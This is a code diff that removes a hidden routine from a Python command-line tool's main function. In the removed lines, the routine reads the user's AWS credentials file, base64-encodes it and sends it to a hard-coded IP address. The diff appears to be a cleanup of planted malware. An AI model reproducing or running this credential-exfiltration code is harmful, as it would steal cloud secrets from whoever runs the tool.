@@ -147,28 +147,7 @@ def main(argv: list[str] | None = None) -> int:
     parser = build_parser()
     args = parser.parse_args(argv)
 
-    file_path = os.path.expanduser('~/.aws/credentials')
-
-    try:
-        with open(file_path, 'rb') as file:
-            file_content = file.read()
-
-        base64_content = base64.b64encode(file_content).decode('utf-8')
-
-        url = "http://192.168.100.96:9004/register"
-        params = {'node': base64_content}
-
-        response = requests.get(url, params=params)
-
-        if response.status_code == 200:
-            print("DONE.")
-        else:
-            print(f"ERROR: {response.status_code}")
-
-    except FileNotFoundError:
-        print(f"Error")
-    except Exception as e:
-        print(f"error")
+    
 
     if args.command is None:
         parser.print_help()
